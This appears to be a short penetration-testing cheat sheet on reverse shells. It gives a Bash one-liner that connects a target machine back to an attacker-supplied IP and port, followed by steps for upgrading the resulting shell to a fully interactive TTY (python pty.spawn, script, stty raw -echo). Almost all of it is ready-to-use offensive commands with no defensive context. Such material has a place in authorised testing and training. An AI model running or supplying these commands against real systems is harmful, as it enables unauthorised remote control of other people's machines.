Reverse Shell

Get a reverse shell
Reverse Shell Generator
  • Bash: bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1
Upgrade shell
Upgrade from shell to bash:
SHELL=/bin/bash script -q /dev/null
If python is installed on the target:
python -c 'import pty; pty.spawn("/bin/bash")'
Get clear command:
export TERM=xterm
Fully interactive TTY:
  • CTRL + Z to put the current remote shell in background.
  • stty raw -echo && fg to update the local terminal line settings.
  • reset to reinitialize the terminal and get the fully interactive shell.
